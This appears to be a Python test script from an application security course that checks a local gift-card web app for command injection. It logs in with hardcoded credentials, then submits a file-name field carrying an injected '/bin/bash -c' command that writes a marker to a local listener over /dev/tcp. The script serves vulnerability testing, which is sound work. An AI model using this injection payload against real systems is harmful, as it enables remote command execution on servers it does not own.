#!/usr/bin/python3

import requests
import re
import socket
from time import sleep

session = requests.Session()
listener = socket.socket()

listener.bind(('127.0.0.1', 6060))
listener.settimeout(5)
listener.listen()

# login post request to get sessionid cookie
get_session = session.get("http://127.0.0.1/login.html")
csrf_token = re.search("csrfmiddlewaretoken\" value=\"(.*)?\"", get_session.text).group(1)

credentials = { "uname" : "hitha" , "pword" : "nyuappsec", "csrfmiddlewaretoken" : csrf_token, }
request1 = session.post("http://127.0.0.1/login", data = credentials)
for cookie in list(session.cookies):
    cookie.secure = False

get_session = session.get("http://127.0.0.1/useCard")
csrf_token = re.search("csrfmiddlewaretoken\" value=\"(.*)?\"", get_session.text).group(1)

file = {'card_data' : open('hr2340-cmdi.gftcrd', 'rb')}
data = {'card_supplied' : 'True', 'card_fname' : 'Name; /bin/bash -c \"echo hr2340 > /dev/tcp/127.0.0.1/6060\" ;Name', 'csrfmiddlewaretoken' : csrf_token}
request2 = session.post('http://127.0.0.1/useCard.html', files = file, data = data)

try:
    connection, address = listener.accept()
    sleep(2)
    string = connection.recv(1024).decode()
    if ("hr2340" in string):
        print("Vulnerable to CMDi!")
    else:
        print("Not Vilnerable to CMDi!")
except:
    print("Not Vulnerable to CMDi!")
